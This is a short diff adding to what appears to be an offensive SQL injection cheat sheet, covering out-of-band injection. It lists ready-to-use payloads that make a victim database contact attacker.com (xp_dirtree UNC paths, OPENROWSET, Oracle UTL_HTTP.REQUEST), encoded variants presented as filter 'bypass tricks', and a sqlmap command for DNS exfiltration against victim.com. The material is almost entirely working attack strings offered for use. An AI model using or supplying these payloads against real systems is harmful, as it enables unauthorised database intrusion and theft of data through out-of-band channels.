@@ -12,3 +12,29 @@ DB tries to connect to attacker.com — leaks info to your server.
 sqlmap Command:
 
 sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=O --dns-domain=attacker.com
+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+Out-of-Band (OOB) SQLi
+
+Normal Payload:
+
+'; exec xp_dirtree '\\attacker.com\share'--
+
+
+Bypass Tricks:
+
+Encode the backslashes (%5C):
+
+'; exec xp_dirtree '\\\\attacker.com\\share'--
+
+
+Use OPENROWSET:
+
+'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pass','SELECT 1')--
+
+
+For Oracle:
+
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual--
